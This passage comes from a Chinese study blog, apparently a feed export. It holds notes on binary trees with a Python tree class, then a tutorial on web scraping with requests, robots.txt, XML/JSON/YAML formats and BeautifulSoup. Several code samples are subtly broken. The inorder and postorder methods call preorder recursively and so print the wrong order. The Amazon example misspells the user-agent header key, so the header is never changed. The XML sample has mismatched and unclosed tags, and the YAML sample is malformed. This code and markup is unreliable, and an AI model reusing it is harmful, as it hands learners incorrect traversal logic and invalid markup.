<h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><h4 id="二叉树性质"><a href="#二叉树性质" class="headerlink" title="二叉树性质"></a>二叉树性质</h4><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587261740039.png" alt="1587261740039"></p>
<p><strong>完全二叉树</strong></p>
<p>若二叉树高度为h，除第h层外，其它各层节点数均为最大，h层有叶子节点，且节点从左到右一次排布，这就是完全二叉树。</p>
<p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587261925583.png" alt="1587261925583"></p>
<h4 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h4><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587262907370.png" alt="1587262907370"></p>
<p><strong>由遍历确定一棵树</strong></p>
<p>必须有两个序列，且其中一个为中序序列，便可通过通过这两个序列还原二叉树</p>
<h4 id="树的实现"><a href="#树的实现" class="headerlink" title="树的实现"></a>树的实现</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        self.elem = item</span><br><span class="line">        self.lchild = <span class="literal">None</span></span><br><span class="line">        self.rchild = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tree</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""二叉树"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.root = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        <span class="string">""" 添加节点"""</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        <span class="keyword">if</span> self.root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.root = node</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        queue = [self.root]</span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            cur_node = queue.pop(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> cur_node.lchild <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                cur_node.lchild = node</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                queue.append(cur_node.lchild)</span><br><span class="line">            <span class="keyword">if</span> cur_node.rchild <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                cur_node.rchild = node</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                queue.append(cur_node.rchild)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 广度优先遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">breadth_travel</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""" 广度优先遍历"""</span></span><br><span class="line">        <span class="keyword">if</span> self.root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        queue = [self.root]</span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            cur_node = queue.pop(<span class="number">0</span>)</span><br><span class="line">            print(cur_node.elem)</span><br><span class="line">            <span class="keyword">if</span> cur_node.lchild <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                queue.append(cur_node.lchild)</span><br><span class="line">            <span class="keyword">if</span> cur_node.rchild <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                queue.append(cur_node.rchild)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 深度优先遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">preorder</span><span class="params">(self, node)</span>:</span></span><br><span class="line">        <span class="string">""" 先序遍历"""</span></span><br><span class="line">        <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        print(node.elem, end=<span class="string">" "</span>)</span><br><span class="line">        self.preorder(node.lchild)</span><br><span class="line">        self.preorder(node.rchild)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inorder</span><span class="params">(self, node)</span>:</span></span><br><span class="line">        <span class="string">""" 中序遍历"""</span></span><br><span class="line">        <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.preorder(node.lchild)</span><br><span class="line">        print(node.elem, end=<span class="string">" "</span>)</span><br><span class="line">        self.preorder(node.rchild)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postorder</span><span class="params">(self, node)</span>:</span></span><br><span class="line">        <span class="string">""" 后序遍历"""</span></span><br><span class="line">        <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.preorder(node.lchild)</span><br><span class="line">        self.preorder(node.rchild)</span><br><span class="line">        print(node.elem, end=<span class="string">" "</span>)</span><br></pre></td></tr></table></figure>

















]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫基础</title>
    <url>/2020/04/19/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h2><p>requests库是一个常用的用于http请求的模块，它使用python语言编写，可以方便的对网页进行爬取，是学习python爬虫的较好的http请求模块。</p>
<h3 id="requests库的7个主要方法"><a href="#requests库的7个主要方法" class="headerlink" title="requests库的7个主要方法"></a>requests库的7个主要方法</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>参数</th>
</tr>
</thead>
<tbody><tr>
<td>requests.request()</td>
<td>构造一个请求</td>
<td>requests.request(method,url,[**kwarges])</td>
</tr>
<tr>
<td>requests.get()</td>
<td>请求获取url位置的资源</td>
<td>r=request.get(url,params,**kwargs)</td>
</tr>
<tr>
<td>requests.head()</td>
<td>请求获取资源的头部信息</td>
<td>requests.head(url,**kwargs)</td>
</tr>
<tr>
<td>requests.post()</td>
<td>请求向url位置的资源后附加新的数据</td>
<td>requests.post(url,data,json,**kwargs)</td>
</tr>
<tr>
<td>requests.put()</td>
<td>请求向url位置存储一个资源覆盖原有的资源</td>
<td>requests.put(url,data,**kwargs)</td>
</tr>
<tr>
<td>requests.patch()</td>
<td>请求改变该资源的部分内容</td>
<td>requests.patch(url,data,**kwargs)</td>
</tr>
<tr>
<td>requests.delete()</td>
<td>请求删除url位置存储的资源</td>
<td>requests.delete(url,**kwargs)</td>
</tr>
</tbody></table>
<p>因为方法过多不一一列举，以request方法为例：</p>
<p>requests.request(method,url,[**kwarges]) ：</p>
<ul>
<li>method：请求方式（get，post，put，patch，head，delete，option）</li>
<li>url：url链接</li>
<li>**kwarges:<ul>
<li>params[字典或字节序列，作为参数增加到url中]</li>
<li>data[字典，字节序列或文件对象，作为request的内容]</li>
<li>json[json格式数据，作为request的内容]</li>
<li>headers[字典，HTTP头]</li>
<li>cookies[字典或cookiejar，request中的cookie]</li>
<li>auth[元组，支持http认证功能]</li>
<li>files[字典，传输文件]</li>
<li>timeout[设定超时时间，以s为单位]</li>
<li>proxies[字典类型，设定代理服务器，可增加登录认证]</li>
<li>allow_redirects[重定向开关，默认为True]</li>
<li>stream[获取内容立即下载开关，默认为True]</li>
<li>verify[认证ssl证书开关，默认为True]</li>
<li>cert[本地ssl证书路径]</li>
</ul>
</li>
</ul>
<h3 id="response对象"><a href="#response对象" class="headerlink" title="response对象"></a>response对象</h3><p>请求<code>requests</code>会构造一个请求资源的<code>requests对象</code>，服务器则会返回一个包含所请求内容的<code>response</code>对象：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>r.status_code</td>
<td>http请求的返回状态</td>
</tr>
<tr>
<td>r.text</td>
<td>HTTP响应内容的字符串形式</td>
</tr>
<tr>
<td>r.encoding</td>
<td>从http header 中猜测的相应内容编码方式</td>
</tr>
<tr>
<td>r.apparent_encoding</td>
<td>从内容中分析出的响应内容的编码方式（备选编码方式）</td>
</tr>
<tr>
<td>r.content</td>
<td>http响应内容的二进制形式</td>
</tr>
</tbody></table>
<h3 id="requests库的异常"><a href="#requests库的异常" class="headerlink" title="requests库的异常"></a>requests库的异常</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>requests.ConectionError</td>
<td>网络连接异常，如DNS查询失败、拒绝连接等</td>
</tr>
<tr>
<td>requests.HTTPError</td>
<td>HTTP错误异常</td>
</tr>
<tr>
<td>requests.URLRequired</td>
<td>URL缺失异常</td>
</tr>
<tr>
<td>requests.TooManyRedirects</td>
<td>超过最大重定向次数</td>
</tr>
<tr>
<td>requests.ConnectTimeout</td>
<td>连接远程服务器超时</td>
</tr>
<tr>
<td>requests.Timeout</td>
<td>请求url超时</td>
</tr>
</tbody></table>
<h3 id="爬取网页的通用代码框架"><a href="#爬取网页的通用代码框架" class="headerlink" title="爬取网页的通用代码框架"></a>爬取网页的通用代码框架</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">	<span class="comment">#网络连接有风险，异常处理很重要</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status() <span class="comment">#如果状态不是200，引发HTTPError异常</span></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"产生异常"</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://www.baidu.com"</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure>

<h3 id="一些实例代码"><a href="#一些实例代码" class="headerlink" title="一些实例代码"></a>一些实例代码</h3><h4 id="京东商品爬取页面实例"><a href="#京东商品爬取页面实例" class="headerlink" title="京东商品爬取页面实例"></a>京东商品爬取页面实例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"https://item.jd.com/2967929.html"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r =requests.get(url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(r.text[:<span class="number">1000</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="亚马逊商品页面的爬取"><a href="#亚马逊商品页面的爬取" class="headerlink" title="亚马逊商品页面的爬取"></a>亚马逊商品页面的爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"https://www.amazon.cn/gp/product/B01M8L5Z3Y"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'usre-agent'</span>:<span class="string">'Mozilla/5.0'</span>&#125; <span class="comment">#更改user-agent头</span></span><br><span class="line">    r=requests.get(url,headers=kv)</span><br><span class="line">    r.encoding=r.apparent_encoding</span><br><span class="line">    print(r.text[:<span class="number">1000</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="百度-360搜索关键词提交"><a href="#百度-360搜索关键词提交" class="headerlink" title="百度/360搜索关键词提交"></a>百度/360搜索关键词提交</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">keyword = <span class="string">"Python"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'wd'</span>:keyword&#125;</span><br><span class="line">    r = requests.get(<span class="string">"http://www.baidu.com/s"</span>,params=kv)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    print(len(r.text))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">keyword = <span class="string">"Python"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'q'</span>:keyword&#125;</span><br><span class="line">    r = requests.get(<span class="string">"http://www.so.com/s"</span>,params=kv)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    print(len(r.text))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="网络图片的爬取和存储"><a href="#网络图片的爬取和存储" class="headerlink" title="网络图片的爬取和存储"></a>网络图片的爬取和存储</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">"https://www.baidu.com/img/bd_logo1.png"</span></span><br><span class="line">path = url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r =requests.get(url)</span><br><span class="line">        <span class="keyword">with</span> open(path,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            print(<span class="string">"文件保存成功"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"文件已存在"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="IP地址归属地的自助查询"><a href="#IP地址归属地的自助查询" class="headerlink" title="IP地址归属地的自助查询"></a>IP地址归属地的自助查询</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://m.ip138.com/ip.asp?ip="</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url+<span class="string">'180.97.33.107'</span>)   <span class="comment">#baidu的IP</span></span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(r.text[<span class="number">-500</span>:])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>

<h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>一般放置在网站的根目录下，用于告诉爬虫哪些网站可以抓取，哪些不行</p>
<h3 id="robots协议的基本语法："><a href="#robots协议的基本语法：" class="headerlink" title="robots协议的基本语法："></a>robots协议的基本语法：</h3><ul>
<li>User-agent：允许访问的爬虫</li>
</ul>
<p>爬虫抓取时会声明自己的身份，这就是User-agent，没错，就是http协议里的User-agent，robots.txt利用User-agent来区分各个引擎的爬虫。</p>
<p>举例说明：百度网页搜索爬虫的User-agent为baiduspider，下面这行就指定百度的爬虫。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">User-agent：baiduspider	<span class="comment">//指定百度的爬虫。</span></span><br><span class="line">User-agent: *			<span class="comment">//指定所有的爬虫</span></span><br></pre></td></tr></table></figure>

<p>关于爬虫的User-agent在网上有相应的列表，比如说google爬虫列表，百度爬虫列表</p>
<ul>
<li>Disallow：不允许爬虫访问的目录</li>
</ul>
<p>Disallow行列出的是不允许爬虫访问的网页，以正斜线 (/) 开头，可以列出特定的网址或模式。要屏蔽整个网站，使用正斜线即可，如：<code>Disallow: /</code></p>
<ul>
<li>举例</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">User-agent: baiduspider	<span class="comment">#允许百度</span></span><br><span class="line">Disallow: /www/			<span class="comment">#禁止访问www目录</span></span><br><span class="line">User-agent: Googlebot	<span class="comment">#允许谷歌</span></span><br><span class="line">Disallow: /root/index.html <span class="comment">#禁止访问root下的index.html</span></span><br></pre></td></tr></table></figure>

<h3 id="robots协议的使用"><a href="#robots协议的使用" class="headerlink" title="robots协议的使用"></a>robots协议的使用</h3><ol>
<li>网络爬虫通过自动或人工识别robots.txt,再进行内容爬取</li>
<li>robots协议是建议但非约束性，网络爬虫可以不遵守，但存在法律风险。</li>
</ol>
<h2 id="信息标记的三种形式"><a href="#信息标记的三种形式" class="headerlink" title="信息标记的三种形式"></a>信息标记的三种形式</h2><h3 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h3><p>由HTML扩展而来的通用信息标记形式，扩展性好，但繁琐</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>Tian<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">lastName</span>&gt;</span>Song<span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">streeAddr</span>&gt;</span>中关村南大街5号<span class="tag">&lt;/<span class="name">streetAddr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">city</span>&gt;</span>北京市<span class="tag">&lt;/<span class="name">city</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>100081<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">prof</span>&gt;</span>Computer System<span class="tag">&lt;/<span class="name">prof</span>&gt;</span><span class="tag">&lt;<span class="name">prof</span>&gt;</span>Security<span class="tag">&lt;/<span class="name">prof</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><p>有类型的键值对，适合程序处理（js），较xml简洁</p>
<p><code>&quot;key&quot;:&quot;value&quot;</code><br><code>&quot;key&quot;:[&quot;value1&quot;,&quot;value2&quot;]</code><br><code>&quot;key&quot;:{&quot;subkey&quot;:&quot;subvalue&quot;}</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"firstName"</span>:<span class="string">"Tian"</span>,</span><br><span class="line">	<span class="attr">"lastNmae"</span>:<span class="string">"Song"</span>,</span><br><span class="line">	<span class="attr">"address"</span>:&#123;</span><br><span class="line">		<span class="attr">"streetAddr"</span>:<span class="string">"中关村南大街5号"</span>,</span><br><span class="line">		<span class="attr">"city"</span>:<span class="string">"北京市"</span>,</span><br><span class="line">		<span class="attr">"zipcode"</span>:<span class="string">"100081"</span></span><br><span class="line">			&#125;,</span><br><span class="line">	<span class="attr">"prof"</span>:[<span class="string">"Computer System"</span>,<span class="string">"Security"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="yaml"><a href="#yaml" class="headerlink" title="yaml"></a>yaml</h3><p>无类型键值对 <code>key：value</code>,可读性好</p>
<p>由<code>缩进</code>表达所属关系，由<code>|</code>表达整块数据，<code>#</code>表示注释，<code>-</code>表示并列的值信息</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">firstName :</span> <span class="string">Tian</span></span><br><span class="line"><span class="attr">lastName :</span> <span class="string">Song</span></span><br><span class="line"><span class="attr">address :</span></span><br><span class="line">	<span class="string">atreeAddr</span> <span class="string">:中关村南大街5号</span></span><br><span class="line">	<span class="string">city:北京市</span></span><br><span class="line">	<span class="string">zipcode:100081</span></span><br><span class="line"><span class="attr">prof :</span></span><br><span class="line"><span class="string">-Computer</span> <span class="string">System</span></span><br><span class="line"><span class="string">-Security</span></span><br></pre></td></tr></table></figure>

<h2 id="BeautifulSoup库学习"><a href="#BeautifulSoup库学习" class="headerlink" title="BeautifulSoup库学习"></a>BeautifulSoup库学习</h2><p>Beautiful Soup 是 python 的一个库,最主要的功能是从网页抓取数据。</p>
<p>Beautiful Soup 提供一些简单的、python 式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据。Beautiful Soup 自动将输入文档转换为 Unicode 编码，输出文档转换为 utf-8 编码。若文档没有指定一个编码方式仅仅需要说明一下原始编码方式就可以了。</p>
<p>推荐使用 BeautifulSoup4，不过它已经被移植到BS4 了，也就是说导入时我们需要 import bs4 。</p>
<p>下面以一个实例开始学习：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="comment">#导入BeautifulSoup,注意大小写</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.baidu.com'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">r.encoding = r.apparent_encoding <span class="comment">#从内容中分析出的响应内容的编码方式</span></span><br><span class="line"><span class="comment">#创建 beautifulsoup 对象，参数1可传入字符串或文件句柄，参数2指定解析器</span></span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line"><span class="comment">#打印文档类容</span></span><br><span class="line">print(soup.prettify())	<span class="comment">#.prettify()对内容html文本内容进行美化输出</span></span><br></pre></td></tr></table></figure>

<h3 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h3><p>选择最合适的解析器来解析这段文档。</p>
<table>
<thead>
<tr>
<th>解析器</th>
<th>使用方法</th>
<th>条件</th>
</tr>
</thead>
<tbody><tr>
<td>bs4的html解析器</td>
<td>BeautifulSoup(mk,’html.parser’)</td>
<td>安装bs4</td>
</tr>
<tr>
<td>lxml的html解析器</td>
<td>BeautifulSoup(mk,’lxml’)</td>
<td>pip install lxml</td>
</tr>
<tr>
<td>lxml的xml解析器</td>
<td>BeautifulSoup(mk,’xml’)</td>
<td>pip install lxml</td>
</tr>
<tr>
<td>html5lib的解析器</td>
<td>BeautifulSoup(mk,’html5lib’)</td>
<td>pip install html5lib</td>
</tr>
</tbody></table>
<h3 id="BeautifulSoup的基本元素"><a href="#BeautifulSoup的基本元素" class="headerlink" title="BeautifulSoup的基本元素"></a>BeautifulSoup的基本元素</h3><p>Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为 4 种: </p>
<table>
<thead>
<tr>
<th>基本元素</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Tag</td>
<td>标签，分别用&lt;&gt;和&lt;/&gt;开头和结尾<code>.&lt;tag&gt;</code>(只列出第一个满足条件的元素)</td>
</tr>
<tr>
<td>Name</td>
<td>标签的名字，格式：<code>&lt;tag&gt;.name</code></td>
</tr>
<tr>
<td>Attrbutes</td>
<td>标签的属性,格式：<code>&lt;tag&gt;.attrs</code></td>
</tr>
<tr>
<td>NavigableString</td>
<td>标签内非属性字符串,<code>&lt;tag&gt;.string</code></td>
</tr>
<tr>
<td>Comment</td>
<td>标签内字符串的注释部分,是一种特殊的NavigableString对象，其输出不包括注释符号.</td>
</tr>
</tbody></table>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="comment">#导入BeautifulSoup,注意大小写</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.baidu.com'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">r.encoding = r.apparent_encoding <span class="comment">#从内容中分析出的响应内容的编码方式</span></span><br><span class="line"><span class="comment">#创建 beautifulsoup 对象</span></span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line"><span class="comment">#用 Beautiful Soup 来方便地获取 Tags。</span></span><br><span class="line"><span class="comment">#可以看到：只列出第一个满足条件的元素</span></span><br><span class="line">print(soup.title)</span><br><span class="line">print(soup.head)</span><br><span class="line">print(soup.a)</span><br><span class="line">print(soup.p)</span><br><span class="line">print()</span><br><span class="line"><span class="comment">#Name</span></span><br><span class="line">print(soup.name)</span><br><span class="line">print(soup.title.name)</span><br><span class="line">print(soup.a.name)</span><br><span class="line">print()</span><br><span class="line"><span class="comment">#Attrbutes</span></span><br><span class="line">print(soup.title.attrs)</span><br><span class="line">print(soup.a.attrs)</span><br><span class="line">print()</span><br><span class="line"><span class="comment">#NavigableString</span></span><br><span class="line">print(soup.title.string)</span><br><span class="line">print(soup.a.string)</span><br></pre></td></tr></table></figure>

<p>comment：</p>
<p>Comment 对象是一个特殊类型的 NavigableString 对象。如果 HTML 页面中含有注释及特殊字符串的内容。而那些内容不是我们想要的，所以我们在使用前最好做下类型判断,然后再进行其他操作，如打印输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="comment">#导入BeautifulSoup,注意大小写</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> element</span><br><span class="line"></span><br><span class="line">text = <span class="string">'&lt;li&gt;&lt;!--注释--&gt;&lt;/li&gt;'</span></span><br><span class="line">soup = BeautifulSoup(text,<span class="string">'lxml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> type(soup.li.string) == element.Comment:</span><br><span class="line">     print(soup.li.string)</span><br></pre></td></tr></table></figure>

<h3 id="遍历文档树"><a href="#遍历文档树" class="headerlink" title="遍历文档树"></a>遍历文档树</h3><table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.contents</td>
<td>子节点的列表，将<code>&lt;tag&gt;</code>所有的儿子节点存入列表</td>
</tr>
<tr>
<td>.children</td>
<td>子节点的迭代类型，与.contents类似，用于循环遍历儿子节点</td>
</tr>
<tr>
<td>.descendants</td>
<td>子孙节点的迭代类型，包含所有的子孙节点，用于循环遍历</td>
</tr>
<tr>
<td>.parent</td>
<td>节点的父亲标签</td>
</tr>
<tr>
<td>.parents</td>
<td>节点的先辈标签的迭代类型，用于循环遍历先辈节点</td>
</tr>
<tr>
<td>.next_sibling</td>
<td>返回按照HTML文本顺序的下一个平行节点标签</td>
</tr>
<tr>
<td>.previous_sibling</td>
<td>返回按照HTML文本顺序的上一个平行节点标签</td>
</tr>
<tr>
<td>.next_siblings</td>
<td>迭代类型，返回按照html文本顺序的后续所有平行节点标签</td>
</tr>
<tr>
<td>.previous_siblings</td>
<td>迭代类型，返回按照html文本顺序的前续所有平行节点标签</td>
</tr>
</tbody></table>
<p>代码示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="comment">#导入BeautifulSoup,注意大小写</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.baidu.com'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">r.encoding = r.apparent_encoding <span class="comment">#从内容中分析出的响应内容的编码方式</span></span><br><span class="line"><span class="comment">#创建 beautifulsoup 对象</span></span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line"></span><br><span class="line">print(type(soup.head.contents))</span><br><span class="line">print()</span><br><span class="line">print(type(soup.head.children))</span><br><span class="line">print()</span><br><span class="line">print(type(soup.head.descendants))</span><br><span class="line">print()</span><br><span class="line">print(type(soup.head.parent))</span><br><span class="line">print()</span><br><span class="line">print(type(soup.div.next_sibling))</span><br><span class="line">print()</span><br><span class="line">print(type(soup.p.previous_sibling))</span><br><span class="line">print()</span><br><span class="line">print(type(soup.p.next_siblings))</span><br><span class="line">print()</span><br><span class="line">print(type(soup.p.previous_siblings))</span><br><span class="line"><span class="comment">#遍历</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.head.contents:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>

